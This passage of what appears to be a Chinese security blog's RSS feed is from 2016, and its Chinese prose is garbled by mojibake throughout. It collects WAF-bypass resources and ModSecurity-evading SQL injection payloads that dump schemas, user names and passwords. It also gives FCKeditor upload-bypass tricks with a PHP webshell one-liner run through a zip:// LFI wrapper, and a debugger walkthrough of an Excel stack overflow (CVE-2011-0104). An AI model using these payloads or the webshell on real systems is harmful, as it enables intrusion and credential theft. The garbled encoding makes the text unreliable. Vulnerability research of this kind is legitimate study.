å€â€,è€Œæ˜¯ä¹‹å‰æ®‹ä½™çš„æ•°æ®,è¿™æ ·å°±è¦çœ‹ç¬¬äºŒä¸ªï¼Œæˆ–è€…ç¬¬ä¸‰ä¸ªé è¿‘çš„è¿”å›åœ°å€äº†
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Sun, 14 Aug 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/14/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0158/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/14/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-0158/</guid>
        
        <category>æ¼æ´åˆ†æ</category>
        
        <category>æ¼æ´æˆ˜äº‰</category>
        
        <category>æ ˆæº¢å‡º</category>
        
        
        <category>äºŒè¿›åˆ¶</category>
        
      </item>
    
      <item>
        <title>wafç»•è¿‡æŠ€å·§åº“</title>
        <description>&lt;h3 id=&quot;x00-links&quot;&gt;0x00 links&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wafç»•è¿‡æŠ€å·§åº“:
http://wafbypass.me/w/index.php/Main_Page  may be a best one```
http://www.freebuf.com/articles/web/10099.html   WAFç»•è¿‡çš„å¥‡æŠ€æ·«å·§
http://tech-technical.com/index.php/2015/11/11/waf-bypass-sql-injection-tutorial/ è€å¤–çš„æŠ€å·§
http://webvuln.blogspot.hk/2015_04_01_archive.html æµ‹è¯•fuzz
http://www.wooyun.org/bugs/wooyun-2014-089426ã€€ã€€good
https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9133  90secæ–°æ€è·¯
http://www.idiot-attacker.com/2016/02/macam-macam-kode-bypass-waf.html good
http://wooyun.org/bugs/wooyun-2010-0121291
http://wooyun.org/bugs/wooyun-2010-0115175 fuzz2bypass
http://drops.wooyun.org/tips/7883 
http://www.securityidiots.com/Web-Pentest/WAF-Bypass/
http://www.pentest.net.cn/post/7
http://www.mottoin.com/86886.html
http://mp.weixin.qq.com/s?__biz=MzIyNjQzMjcyNw==&amp;amp;mid=2247483860&amp;amp;idx=1&amp;amp;sn=fa19f02e29d25f5f6852af27451ae4a9&amp;amp;scene=23&amp;amp;srcid=0815JYA53l0Bk3PMkhzRlKUh#rd
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-bypassed&quot;&gt;0x01 bypassed&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;modsecurity
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.schemata*/--
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(column_name as char))),0x27,0x7e),version(),5,6,7,8 from `information_schema`.columns where table_name=0x75736572*/--
id=-29 /*!30000union select 1,2,group_concat(0x7e,0x27,unhex(Hex(cast(name as char))),0x3a,unhex(Hex(cast(password as char))),0x27,0x7e),version(),5,6,7,8 from user*/--
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 12 Aug 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</link>
        <guid isPermaLink="true">/web/2016/08/12/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%BA%93/</guid>
        
        <category>waf</category>
        
        <category>bypass</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>fckeditorå„ç‰ˆæœ¬ç»•è¿‡</title>
        <description>&lt;h3 id=&quot;x00-fckeditor&quot;&gt;0x00 fckeditorä¸Šä¼ æ¼æ´æ€»ç»“&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://sec.chinabyte.com/206/13708206.shtml
http://www.cnbraid.com/2015/07/09/fckeditor/
http://www.it610.com/article/1842939.htm
http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf &amp;lt;=2.6.4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-asp&quot;&gt;0x01 asp&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;=2.6.4
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
2.6.6
    http://www.hack80.com/thread-320-1-1.html
    http://www.qhwins.com/ShowNews/?11-20109214030542523.html
2.6.8
    http://www.freebuf.com/vuls/6408.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-php&quot;&gt;0x02 php&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;=2.6.4
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-fckeditor&quot;&gt;0x03 fckeditorç»å…¸å°è¯•åç¼€&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;å°†åç¼€æ”¹æˆ.php.pjpg
2&amp;gt;å°†åç¼€æ”¹æˆ.html
3&amp;gt;å°†åç¼€æ”¹æˆ.lnk
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-&quot;&gt;0x04 å…¶å®ƒä¸Šä¼ æŠ€å·§&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;ä¸Šä¼ æ—¶,å»¶è¿Ÿä¸€ä¸‹å†ä¸Šä¼ ,æœ‰æ—¶èƒ½bypass admin,ç”¨åˆ°firefox tamperæ’ä»¶
    https://www.youtube.com/watch?v=6hJ-d2NYLBg
2&amp;gt;åŒæ–‡ä»¶ä¸Šä¼ 
3&amp;gt;ä¸Šä¼ ä»¥å›¾ç‰‡åç¼€åä¸ºåç¼€çš„å‹ç¼©æ–‡ä»¶,æ–‡ä»¶å®é™…æ˜¯ä¸€ä¸ªwebshell.phpæ–‡ä»¶çš„å‹ç¼©æ–‡ä»¶(zip),åˆ©ç”¨lfiæ¼æ´å¹¶å°†lfiè¦åŒ…å«
  çš„æ–‡ä»¶çš„å‚æ•°èµ‹å€¼ä¸º:
    zip://archive.zip#webshell.php
    æˆ–
    zip://archive.zip#webshell.php&amp;amp;param1=system&amp;amp;param2=ls   ===&amp;gt;è¿™é‡Œå¯¹åº”webshell.phpä¸º:
        &amp;lt;?php $_GET[&#39;param1&#39;]($_GET[&#39;param2&#39;]);?&amp;gt;
  è¿™é‡Œé€‚ç”¨çš„æƒ…å†µä¸º:
    a&amp;gt;å¯ä¸Šä¼ ä»»æ„å†…å®¹æ–‡ä»¶(é€šè¿‡ä¿®æ”¹Content-Typeç­‰è¾¾åˆ°ç›®çš„),ä½†æ–‡ä»¶ä¼šè¢«é‡å‘½ä»¤ä¸ºä»¥pngä¸ºåç¼€æ–‡ä»¶
    b&amp;gt;æ‰¾åˆ°äº†lfiæ¼æ´,ä½†æ˜¯lfiæ¼æ´ä¸èƒ½åŒ…å‡½.|./|..|..\|...ç­‰æƒ…å†µ
  æ›´å¤šç»†èŠ‚:
    https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 12 Aug 2016 00:00:00 +0800</pubDate>
        <link>/web/2016/08/12/fckeditor%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</link>
        <guid isPermaLink="true">/web/2016/08/12/fckeditor%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</guid>
        
        <category>fckeditor</category>
        
        <category>web</category>
        
        <category>upload</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>æ¼æ´æˆ˜äº‰-cve-2011-0104</title>
        <description>&lt;h3 id=&quot;x00-about&quot;&gt;0x00 about&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ç›®æ ‡:åˆ†æcve-2011-0104
æ¼æ´:excel TOOLBARDEF Recordæ ˆæº¢å‡ºæ¼æ´
good article:
    http://m.2cto.com/Article/201112/114614.html
å®éªŒç¯å¢ƒ:
    excel 2003 sp3
    windows 2003 sp2 32ä½
æ¼æ´è§¦å‘æ ·æœ¬:
    https://github.com/riusksk/vul_wars/raw/master/%E4%B9%A6%E7%B1%8D%E9%85%8D%E5%A5%97%E8%B5%84%E6%96%99.zip
    ä¸­çš„exploit.xlb

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x01-windbg&quot;&gt;0x01 windbgçŸ¥è¯†&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    http://www.yiiyee.cn/Blog/windbg/
    http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx

    db esi:æŸ¥çœ‹esiåœ°å€ä¸­çš„å†…å®¹
        db 400000:æŸ¥çœ‹0x400000å¤„çš„å†…å®¹,dbæŒ‰å­—èŠ‚å¤§å°æŸ¥çœ‹,ddæŒ‰DWORDç±»å‹æŸ¥çœ‹
        dd poi(addr)
            poi(addr)ç›¸å½“äº[addr],ä¹Ÿå³addrä¸­å­˜æ”¾çš„å€¼,dd poi(addr)ä¹Ÿå³ç›¸å½“äºdd addr1,å…¶ä¸­addr1=[addr]
    !address edi:æ˜¾ç¤ºediåœ°å€å¤„çš„å†…å­˜çŠ¶æ€,ä¿¡æ¯
    lmm mso v:åŒ¹é…msoæ¨¡å—,å¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯
    bp eax:åœ¨eaxå¤„ä¸‹æ–­ç‚¹,æ”¯æŒç¬¬å‡ æ¬¡ç»è¿‡åä¸­æ–­,æ”¯æŒä¸­æ–­åæ‰§è¡Œå‘½ä»¤
    g:è®©è¢«è°ƒè¯•çš„ç¨‹åºç»§ç»­è¿è¡Œ(f5)
        gh:æŠŠå¼‚å¸¸æ ‡è¯†ä¸ºå·²å¤„ç†å¹¶æ–­ç»­æ‰§è¡Œç¨‹åº
        go:å¯¹å¼‚å¸¸ä¸è¿›è¡Œä»»ä½•å¤„ç†å¹¶ç»§ç»­æ‰§è¡Œç¨‹åº
    kb:æ˜¾ç¤ºä¼ é€’ç»™å †æ ˆå›æº¯ä¸­çš„æ¯ä¸ªå‡½æ•°çš„å‰ä¸‰ä¸ªå‚æ•°
        kp:æ˜¾ç¤ºä¼ é€’ç»™å †æ ˆå›æº¯ä¸­çš„æ¯ä¸ªå‡½æ•°çš„æ‰€æœ‰å‚æ•°
    ub mso!Ordinal1273+0x2581:åæ±‡ç¼–mso!Ordinal1273+0x2581åœ°å€ä¹‹å‰çš„ä»£ç 
        uf test!main:åæ±‡ç¼–test!mainå‡½æ•°
    p:å•æ­¥æ­¥å…¥step over
    t:å•æ­¥æ­¥è¿‡trace into
    gu:æ‰§è¡Œåˆ°ä¸Šä¸€å±‚å‡½æ•°,ä¹Ÿå³æŠŠå½“å‰å‡½æ•°å¸§æ‰§è¡Œåˆ°retn,å¹¶æ‰§è¡Œè¿™ä¸ªretn
    ? ebp-edi:æ˜¾ç¤ºè¡¨è¾¾å¼ebp-ediçš„å€¼
        ?? expression:æ˜¾ç¤ºc++è¡¨è¾¾å¼çš„å€¼
    .cls:æ¸…å±
    è·å–è¿›ç¨‹ç¯å¢ƒå—_PEB:
        a&amp;gt;.process è·å¾—_PEBåœ°å€è®¾ä¸ºaddr
          dt _PEB 0xaddrå¯å¾—åˆ°_PEBç»“æ„çš„æ•°æ®
        b&amp;gt;ä¹Ÿå¯é€šè¿‡dt _PEB @$pebç›´æ¥è·å–_PEBç»“æ„çš„æ•°æ®
    æŸ¥çœ‹å †çš„ä¿¡æ¯:
        !heap -h æŸ¥çœ‹æ‰€æœ‰å †çš„åœ°å€
        dt _HEAP 0xaddr æŸ¥çœ‹ä¸€ä¸ªå †çš„ä¿¡æ¯
        dt _LIST_ENTRY 0xaddr æŸ¥çœ‹addråœ°å€ä¸­å­˜æ”¾çš„å †å—ç´¢å¼•ä¿¡æ¯,å¾—åˆ°çš„ç»“æœä¸ºFlinkå’ŒBlinkçš„å€¼
    bp addr åœ¨addrå¤„è®¾ç½®æ–­ç‚¹
    bl æŸ¥çœ‹æ‰€æœ‰æœ‰å·²ç»è®¾ç½®çš„æ–­ç‚¹
    bc æ¸…é™¤æ‰€æœ‰æ–­ç‚¹
        bc * æ¸…é™¤æ‰€æœ‰æ–­ç‚¹
    bu å¯¹æŸä¸ªç¬¦å·ä¸‹æ–­ç‚¹,eg. bu MyApp!SomeFunction
        åœ¨ä»£ç è¢«ä¿®æ”¹ä¹‹å,è¯¥æ–­ç‚¹ä¼šéšç€å‡½æ•°åœ°å€æ”¹å˜è€Œè‡ªåŠ¨æ›´æ–°åˆ°æœ€æ–°ä½ç½®,è€Œä¸”buæ–­ç‚¹ä¼šä¿å­˜åœ¨WinDbgå·¥ä½œç©ºé—´ä¸­,ä¸‹
        æ¬¡å¯åŠ¨WinDbgæ—¶è¯¥æ–­ç‚¹ä¼šè‡ªåŠ¨è®¾ç½®
    bd ç¦ç”¨æ–­ç‚¹
    be å¯ç”¨è¢«bdå‘½ä»¤ç¦ç”¨çš„æ–­ç‚¹
    ba e|r|w(æ‰§è¡Œ|è¯»|å†™) 1|2|4|8(å•ä½å­—èŠ‚) addr
        eg.å¯¹å†…å­˜0x11111111è¿›è¡Œå†™æ“ä½œçš„æ—¶å€™ä¸‹æ–­ç‚¹å‘½ä»¤ä¸º:ba w4 0x11111111
    sxe ld:ModuleName åœ¨é¦–æ¬¡åŠ è½½ModuleNameå¯¹åº”çš„æ¨¡å—æ—¶ä¸­æ–­
        sx{e|d|i|n} [-c &quot;Cmd1&quot;] [-c2 &quot;Cmd2&quot;] [-h] {Exception|Event|*} 
            http://blog.csdn.net/hgy413/article/details/7598236
    !heap -h æŸ¥çœ‹æ‰€æœ‰çš„å †çš„æƒ…å†µ,ä¹Ÿå¯é€šè¿‡!heapç›´æ¥æŸ¥çœ‹
    !heap -a addr addrè¦æ±‚æ˜¯ä¸€ä¸ªå †çš„èµ·å§‹åœ°å€,è¯¥å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªå †çš„ä¿¡æ¯
    !heap -p -a addr æŸ¥çœ‹ä¸€ä¸ªåœ°å€åœ¨å“ªä¸ªå †å—ä¸­,å¹¶æ˜¾ç¤ºè¿™ä¸ªå †å—çš„ä¿¡æ¯

    å…¶ä¸­windbgä¸­çš„kbå‘½ä»¤ç›¸å½“äºodä¸­çš„æŸ¥çœ‹è°ƒç”¨å †æ ˆ(alt+k),å¦‚ä¸‹å›¾ä¸­çš„ChildEBPåˆ—ä¸ºå½“å‰eipå¯¹åº”çš„ebpçš„å€¼,RetAddrä¸ºå½“
    å‰eipæ‰€åœ¨çš„å‡½æ•°çš„å‡½æ•°è¿”å›åœ°å€,Args to Childä¸ºå½“å‰å‡½æ•°çš„å‚æ•°,æœ€åä¸€åˆ—çš„åœ°å€æ˜¯å½“å‰æ’çš„ä¸Šä¸€æ’ä¸­çš„RetAddrçš„å€¼

    è¦æ³¨æ„çš„æ˜¯,å¹¶ä¸æ˜¯kbä¸‹é¢çš„æ‰€æœ‰çš„ChildEBPå¯¹åº”çš„ä¸€åˆ—éƒ½æ˜¯å‡½æ•°è°ƒç”¨,åªæœ‰ç¬¬ä¸€æ’çš„ChildEBP,RetAddr,Args to
    Childçš„æ•°æ®å€¼æ˜¯å½“å‰çš„å‡½æ•°è°ƒç”¨çš„ç›¸å…³å‚æ•°,ä»ç¬¬äºŒæ’å¼€å§‹çš„åªæ˜¯æ ˆä¸­é«˜åœ°å€çš„æ•°æ®å†…å®¹ä»ebpåˆ°retnåˆ°å‚æ•°ç›¸å½“äºåœ°å€ä»

    ä¸€èˆ¬æƒ…å†µä¸‹,æ ˆç©ºé—´ä¸­çš„ä½åœ°å€å‘é«˜åœ°å€çš„æ’åˆ—,å‡½æ•°è°ƒç”¨æ—¶,æ ˆä¸­çš„æ•°æ®å¦‚ä¸‹:

                    ...
                    ...    (new ebpä¸ºå½“å‰å‡½æ•°å¸§ä¸­çš„æ–°çš„ebp,æ­¤å¤„çš„new ebpä»£è¡¨å½“å‰å‡½æ•°å¸§çš„ebpçš„ä½ç½®æ‰€åœ¨)
        new ebp --&amp;gt; old ebp(old ebpä¸ºä¸Šä¸€å‡½æ•°å¸§çš„ebp,æ­¤å¤„çš„old ebpä»£è¡¨new ebpä½ç½®ä¸­çš„å†…å®¹å€¼)
                    retn   (retnä¸ºå½“å‰å‡½æ•°çš„è¿”å›åœ°å€)
                    arg1   (arg1ä¸ºå½“å‰å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°)
                    arg2   (arg2ä¸ºå½“å‰å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°)
                    ...

    ä¹Ÿå³å½“å‰ebpä¸­å­˜æ”¾çš„æ˜¯ä¸Šä¸€å‡½æ•°å¸§çš„ebp,ä¸”å½“å‰ebpçš„ä¸‹ä¸€æ ˆå•å…ƒçš„å†…å®¹ä¸ºå½“å‰å‡½æ•°çš„retnåœ°å€
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/windbg_kb.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 è°ƒè¯•è¿‡ç¨‹&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;è¿è¡Œexcel
è¿è¡Œwindbg
    f6åŠ è½½excel
    g
excelä¸­æ‰“å¼€exploit.xbl
windbgä¸­å‘ç°excelå¼‚å¸¸,ç»“æœå¦‚ä¸‹:

    ---------------violation--------------
    (f88.f34): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=51455047 ebx=0013ca48 ecx=00000006 edx=000014a8 esi=00000000 edi=00000400
    eip=300e06f7 esp=0013aa04 ebp=0013aa70 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\EXCEL.EXE - 
    EXCEL!Ordinal41+0xe06f7:
    300e06f7 8908            mov     dword ptr [eax],ecx  ds:0023:51455047=????????
    -----------------end------------------
    
    windbgæ•è·excelå´©æºƒå…³é”®ä¿¡æ¯eip=300e06f7,å¼€å§‹è¦ç”¨windbgåŠ è½½excel,ä¸èƒ½ç”¨odåŠ è½½,å› ä¸ºodä¸èƒ½æ•è·åˆ°è¿™ä¸ªå¼€å§‹çš„å´©
    æºƒä¿¡æ¯,kbè¿˜å¯æŸ¥çœ‹å´©æºƒæ—¶çš„å‡½æ•°è°ƒç”¨æƒ…å†µ,å¦‚ä¸‹
    kb(å¯æŸ¥çœ‹è°ƒç”¨å †æ ˆ)
    --------------kb---------------
    ChildEBP RetAddr  Args to Child              
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0013aa70 584b4c4b 30435451 50453043 55514b4c EXCEL!Ordinal41+0xe06f7
    0013aa74 30435451 50453043 55514b4c 4b4c4c47 0x584b4c4b
    0013aa78 50453043 55514b4c 4b4c4c47 35434c43 EXCEL!Ordinal41+0x435451
    --------------end--------------

å…³é—­excel,windbg
é‡æ–°åœ¨odä¸­æ‰“å¼€,å¹¶åŠ è½½excel

in od:
    f9
    ctrl+g:300e06f7
    åœ¨300e06f7å¤„å¾€ä¸Šæ‰¾åˆ°å½“å‰å‡½æ•°å¸§çš„ç¬¬ä¸€å¥push ebp,mov mov ebp,esp,å¹¶åœ¨push ebpä¸Š(addr=300e05ad)ä¸‹æ–­

excelæ‰“å¼€exploit.xbl

in od:
odä¸­æ–­åˆ°300e05adå¤„
f8
f8
åœ¨æ±‡ç¼–çª—å£ä¸­ctrl+g:ebp(æ­¤æ—¶ebp=12aa70)
å³é”®åœ¨ebpçš„åœ°å€å¤„ä¸‹å†…å­˜å†™å…¥æ–­ç‚¹
    å†…å­˜å†™å…¥æ–­ç‚¹æ— æ³•é€šè¿‡ctrl+bæŸ¥çœ‹,åªæœ‰åœ¨ä¸­æ–­æ—¶çŠ¶æ€æ ä¼šæ˜¾ç¤º.åœ¨è¿›å…¥300e05adä¹‹åå†åœ¨è¯¥å‡½æ•°çš„ebpä¸Šä¸‹å†…å­˜å†™å…¥
    æ–­ç‚¹è¿™æ ·å°±å¯ä»¥å¾ˆå¿«å®šä½å‡ºæ˜¯å“ªå¥æ±‡ç¼–æŒ‡ä»¤åœ¨æ“ä½œæ•°æ®æ—¶ä¼šè¦†ç›–ebp(è¦†ç›–ebpä¹Ÿå³ä¼šå¯¹ebpæœ‰å†™å…¥æ“ä½œ),ç”±ä¸Šé¢ebpå’Œ
    retnçš„å…³ç³»æ˜“çŸ¥,åœ¨ä¸€ä¸ªå‡½æ•°å¸§ä¸­,å½“å‰ebpè¢«å¤„çš„å†…å®¹è¢«è¦†ç›–è¯´æ˜retnä¹Ÿè¢«è¦†ç›–(ä¸€èˆ¬ä¸å‡ºç°åˆšå¥½è¦†ç›–åˆ°ebp,ä¸è¦†ç›–
    çš„ä¹ƒçš„æƒ…å†µ)
    
f9
    ä¸­æ–­å‘ç”Ÿåœ¨300de834å¤„,å¦‚ä¸‹:
    ----------------opperate_ebp-------------------
    300DE7EB   .  C3            retn
    300DE7EC   $  53            push ebx
    300DE7ED   .  8B5C24 0C     mov ebx,dword ptr ss:[esp+0xC]
    300DE7F1   .  85DB          test ebx,ebx
    300DE7F3   .  0F84 89970200 je EXCEL.30107F82
    300DE7F9   .  3B5C24 10     cmp ebx,dword ptr ss:[esp+0x10]                                               ;  EXCEL.3070DF42
    300DE7FD   .  0F87 03A71500 ja EXCEL.30238F06
    300DE803   .  8B15 442C8930 mov edx,dword ptr ds:[0x30892C44]
    300DE809   .  A1 402C8930   mov eax,dword ptr ds:[0x30892C40]
    300DE80E   .  55            push ebp
    300DE80F   .  8B6C24 0C     mov ebp,dword ptr ss:[esp+0xC]
    300DE813   .  56            push esi                                                                      ;  EXCEL.3088ECC0
    300DE814   .  57            push edi
    300DE815   &amp;gt;  3BD0          cmp edx,eax
    300DE817   .  0F8D F0B90300 jge EXCEL.3011A20D
    300DE81D   &amp;gt;  2BC2          sub eax,edx
    300DE81F   .  3BD8          cmp ebx,eax
    300DE821   .  7D 02         jge short EXCEL.300DE825
    300DE823   .  8BC3          mov eax,ebx
    300DE825   &amp;gt;  8DB2 40EC8830 lea esi,dword ptr ds:[edx+0x3088EC40]
    300DE82B   .  8BC8          mov ecx,eax
    300DE82D   .  8BD1          mov edx,ecx
    300DE82F   .  C1E9 02       shr ecx,0x2
    300DE832   .  8BFD          mov edi,ebp
    300DE834   .  F3:A5         rep movs dword ptr es:[edi],dword ptr ds:[esi]
    300DE836   .  8BCA          mov ecx,edx
    300DE838   .  83E1 03       and ecx,0x3
    300DE83B   .  F3:A4         rep movs byte ptr es:[edi],byte ptr ds:[esi]
    ---------------------end-----------------------
        
    300de834çš„å…¥å£åœ¨300de7ec,eip=300de834æ—¶,edi=12aa6f,esi=3088ecc0(å†…å®¹ä¸º&quot;ABuJIKLK...&quot;),ebp=12aa0f,è¿™æ ·çš„è¯æ•°
    æ®å°†è¢«å¤åˆ¶åˆ°edi(12aa6f)å¤„,å¯æ˜¯æ ˆçª—å£ä¸­,edi(12aaf6)å·²ç»åœ¨ebp(12aa0f)çš„ä¸‹é¢,å¦‚æœæ•°æ®ä»ediå¼€å§‹è¦†ç›–,æ˜¯ä¸ä¼šè¦†
    ç›–ebpçš„,è¿™æ ·åº”è¯¥ä¸ä¼šå¼•èµ·retnè¢«è¦†ç›–,æ—¢ç„¶ä¸ä¼šè¦†ç›–å½“å‰å‡½æ•°å¸§çš„ebp,äºæ˜¯çœ‹çœ‹ä¼šä¸ä¼šè¦†ç›–ä¸Šä¸€å‡½æ•°å¸§çš„ebp

alt+k(æŸ¥çœ‹è°ƒç”¨å †æ ˆ)

    -----------alt+k------------
    è°ƒç”¨å †æ ˆ:     ä¸»çº¿ç¨‹
    åœ°å€       å †æ ˆ       å‡½æ•°è¿‡ç¨‹ / å‚æ•°                       è°ƒç”¨æ¥è‡ª                      ç»“æ„
    001279C0   3070DF42   EXCEL.300DE7EC                        EXCEL.3070DF3D
    0012A9EC   30237FDF   ? EXCEL.3070DD5F                      EXCEL.30237FDA
    ------------end-------------

    ä¸Šé¢ç»“æœè¡¨ç¤º,å½“å‰å‡½æ•°ä¸º300de7ec,ä¸Šä¸€å¸§å‡½æ•°ä¸º3070dd5f,ä¸ºäº†æŸ¥çœ‹ä¸Šä¸€å‡½æ•°å¸§çš„ebp,åœ¨alt+kçª—å£ä¸­å³é”®å•å‡»
    3070dd5f,é€‰æ‹©&quot;æ˜¾ç¤ºå‡½æ•°è¿‡ç¨‹&quot;,ç„¶ååœ¨3070dd5fä¸Šä¸‹æ–­ç‚¹,é‡æ–°è¿è¡Œodå’Œexcel,odä¸­æ–­åˆ°3070dd5få¤„

    ä¸­æ–­å‘ç”Ÿ,eip=3070dd5f,ebp=0012aa70(è¿™ä¸ªebpä¸ä¸Šé¢è¿›å…¥300e05adå‡½æ•°çš„ebpç›¸ç­‰,å¯è§3070dd5få‡½æ•°çš„ä¸Šä¸€å‡½æ•°å¸§ä¸º
    300e05ad,alt+kæŸ¥çœ‹è°ƒç”¨å †æ ˆä¹Ÿå¯çœ‹å‡ºçš„ç¡®æ˜¯è¿™æ ·)

f8
f8(æ­¤æ—¶ebp=00129aac,ä¹Ÿå³ä¸Šé¢è¯´çš„&quot;äºæ˜¯çœ‹çœ‹ä¼šä¸ä¼šè¦†ç›–ä¸Šä¸€å‡½æ•°å¸§çš„ebp&quot;ä¸­çš„ebp),129aac&amp;lt;12aa6f,æ‰€ä»¥ä¹Ÿä¸ä¼šè¦†ç›–åˆ°
è¿™ä¸ª3070dd5få‡½æ•°çš„ebp,3070dd5fçš„å…¥å£æ±‡ç¼–æŒ‡ä»¤å¦‚ä¸‹:

    ----------------3070dd5f------------------
    3070DD5F  /$  55            push ebp
    3070DD60  |.  8DAC24 C4F0FF&amp;gt;lea ebp,dword ptr ss:[esp-0xF3C]
    3070DD67  |.  81EC EC0F0000 sub esp,0xFEC
    3070DD6D  |.  A1 00F08930   mov eax,dword ptr ds:[0x3089F000]
    3070DD72  |.  8365 58 00    and [arg.21],0x0
    ------------------end---------------------
    
    å¹¶ä¸æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹çš„push ebp,mov ebp,esp,æ‰€ä»¥è¿™é‡Œä¸èƒ½ç›´æ¥åœ¨3070dd5fä¸­æ–­åf8+f8åˆ°eip=3070dd67å¤„é€šè¿‡æŸ¥çœ‹ebpä¸­å­˜
    æ”¾çš„å†…å®¹(ä¹Ÿå³[ebp])æ¥æŸ¥çœ‹ä¸Šä¸€å¸§å‡½æ•°çš„ebpäº†,è¦æŸ¥çœ‹ä¸Šä¸€å¸§çš„ebp,é€šè¿‡åœ¨å‡½æ•°åˆšåˆšè¿›å…¥æ‰§è¡Œå®Œpush ebpåç›´æ¥æŸ¥çœ‹
    [esp]ä¾¿æ˜¯ä¸Šä¸€å¸§çš„ebpå†…å®¹äº†,æ‰€ä»¥è¿™é‡Œæ€»ç»“å‡ºåœ¨å½“å‰å‡½æ•°å¸§æŸ¥çœ‹ä¸Šä¸€å¸§å‡½æ•°çš„ebpçš„æ–¹æ³•æœ‰å¦‚ä¸‹ä¸¤ç§:

        1&amp;gt;åœ¨å½“å‰å‡½æ•°å¸§ä¸­ç›´æ¥æŸ¥çœ‹[ebp],è¿™ç§æ–¹æ³•å¯¹ä¸€èˆ¬æƒ…å†µä¸‹é€‚ç”¨,å¯¹å½“å‰å‡½æ•°å¸§çš„æœ€å¼€å§‹ä¸¤å¥æ±‡ç¼–æŒ‡ä»¤ä¸æ˜¯push ebp,mov
        ebp,espçš„æƒ…å†µä¸é€‚ç”¨

        2&amp;gt;åœ¨å½“å‰å‡½æ•°å¸§åˆšæ‰§è¡Œå®Œç¬¬ä¸€å¥push ebpå,æŸ¥çœ‹[esp]ä¸ºå¤šå°‘,ä¸Šä¸€å‡½æ•°å¸§çš„ebpå°±æ˜¯å¤šå°‘,è¦æ±‚ç¬¬ä¸€å¥æ˜¯push ebp,
        å‡ ä¹å¤§å¤šå‡½æ•°éƒ½é€‚ç”¨
    
    æ—¢ç„¶ä¹Ÿä¸ä¼šè¦†ç›–åˆ°ä¸Šä¸€å¸§å‡½æ•°çš„ebp,çœ‹çœ‹ä¼šä¸ä¼šè¦†ç›–åˆ°ä¸Šä¸€å¸§çš„ä¸Šä¸€å¸§å‡½æ•°çš„ebp
